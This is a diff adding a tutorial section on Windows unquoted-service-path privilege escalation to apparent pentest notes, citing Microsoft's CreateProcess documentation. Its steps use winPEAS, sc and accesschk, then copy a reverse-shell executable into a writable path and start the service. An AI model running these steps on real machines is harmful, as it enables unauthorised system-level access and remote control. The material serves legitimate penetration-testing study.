@@ -546,7 +546,63 @@ Use winPEAS to check for service misconfigurations:
 
 ### Unquoted Service Path
 
+If the path to the service binary is not wrapped in quotes and there are spaces in the path. This stems from the way Windows handles `CreateProcess` API calls:
 
+> If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous. For example, consider the string "c:\program files\sub dir\program name". This string can be interpreted in a number of ways. The system tries to interpret the possibilities in the following order:
+>
+> **c:\program.exe** 
+>
+> **c:\program files\sub.exe** 
+>
+> **c:\program files\sub dir\program.exe**
+>
+> **c:\program files\sub dir\program name.exe...**
+
+More information here:
+
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa" %}
+
+{% embed url="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" %}
+
+#### Unquoted Service Path Privilege Escalation
+
+1. To check for service misconfigurations, run winPEAS:
+
+   ```text
+   > .\winPEASany.exe quiet servicesinfo
+   ```
+
+2. Note an unquoted path that also contains spaces:
+
+   ```text
+   C:\Program Files\Unquoted Path Service\Common Files\service_name.exe
+   ```
+
+3. Perform a query to the service with  sc to confirm this:
+
+   ```text
+   > sc qc <unquoted_service_name>
+   ```
+
+4. To check for write rights, use accesschk.exe:
+
+   ```text
+   > .\accesschk.exe /accepteula -uwdq C:\
+   > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+   > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+   ```
+
+5. Copy the reverse shell executable and rename it appropriately:
+
+   ```text
+   > copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+   ```
+
+6. Start a listener on our host \(e.g Kali or Parrot\), and then start the service to trigger the exploit:
+
+   ```text
+   > net start <service_name>
+   ```
 
 **Valid executable path Discovery:**
 
